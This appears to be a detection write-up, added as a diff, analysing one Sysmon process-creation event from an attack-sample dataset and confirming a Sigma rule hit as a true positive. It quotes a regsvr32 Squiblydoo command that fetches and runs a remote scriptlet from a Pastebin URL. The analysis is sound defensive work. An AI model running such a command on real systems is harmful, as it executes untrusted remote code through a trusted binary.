@@ -1,0 +1,57 @@
+# Event Analysis
+
+## Dataset
+
+EVTX-ATTACK-SAMPLES
+
+---
+
+## Sample
+
+exec_sysmon_lobin_regsvr32_sct.evtx
+
+---
+
+## Event
+
+Sysmon Event ID 1 – Process Creation
+
+---
+
+## Observed Process
+
+Image
+
+C:\Windows\System32\regsvr32.exe
+
+Parent Image
+
+C:\Windows\System32\cmd.exe
+
+User
+
+SYSTEM
+
+---
+
+## Observed Command
+
+regsvr32.exe /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll
+
+---
+
+## Analysis
+
+The process creation event records the execution of Regsvr32 with the `/i:` parameter referencing a remote HTTP resource while loading `scrobj.dll`.
+
+This behavior matches the Squiblydoo execution technique, in which Regsvr32 is abused to execute remote scriptlets using a trusted Windows binary.
+
+Because the command references a public Pastebin URL instead of a legitimate internal resource, the activity represents a high-confidence indicator of suspicious execution.
+
+---
+
+## Detection Outcome
+
+True Positive
+
+The observed behavior matches known attacker tradecraft associated with Regsvr32 abuse and satisfies the detection logic implemented in the Sigma rule.
